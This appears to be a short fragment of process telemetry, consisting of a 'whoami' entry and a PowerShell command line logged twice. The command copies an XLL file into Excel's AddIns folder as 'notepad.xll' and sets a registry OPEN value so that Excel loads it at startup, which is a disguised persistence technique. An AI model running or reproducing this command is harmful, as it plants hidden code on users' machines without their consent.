Data.#text: Microsoft Edge Update COM Registration Helper
whoami - displays logged on user information

"powershell.exe" & {$excelApp = New-Object -COMObject \""Excel.Application\"", if(-not $excelApp.path.contains(\""Program Files (x86)\"")){,     Write-Host \""64-bit Office\"",     Copy \""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.006\bin\Addins\excelxll_x64.xll\"" \""$env:APPDATA\Microsoft\AddIns\notepad.xll\"", }, else{,   Write-Host \""32-bit Office\"",   Copy \""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.006\bin\Addins\excelxll_x86.xll\"" \""$env:APPDATA\Microsoft\AddIns\notepad.xll\"", }, $ver = $excelApp.version, $ExcelRegPath=\""HKCU:\Software\Microsoft\Office\$Ver\Excel\Options\"", Remove-Item $ExcelRegPath -ErrorAction Ignore, New-Item -type Directory $ExcelRegPath | Out-Null, New-ItemProperty $ExcelRegPath OPEN -value \""/R notepad.xll\"" -propertyType string | Out-Null, $excelApp.Quit(), Start-Process \""Excel\""}

"powershell.exe" & {$excelApp = New-Object -COMObject \""Excel.Application\"", if(-not $excelApp.path.contains(\""Program Files (x86)\"")){,     Write-Host \""64-bit Office\"",     Copy \""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.006\bin\Addins\excelxll_x64.xll\"" \""$env:APPDATA\Microsoft\AddIns\notepad.xll\"", }, else{,   Write-Host \""32-bit Office\"",   Copy \""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.006\bin\Addins\excelxll_x86.xll\"" \""$env:APPDATA\Microsoft\AddIns\notepad.xll\"", }, $ver = $excelApp.version, $ExcelRegPath=\""HKCU:\Software\Microsoft\Office\$Ver\Excel\Options\"", Remove-Item $ExcelRegPath -ErrorAction Ignore, New-Item -type Directory $ExcelRegPath | Out-Null, New-ItemProperty $ExcelRegPath OPEN -value \""/R notepad.xll\"" -propertyType string | Out-Null, $excelApp.Quit(), Start-Process \""Excel\""}
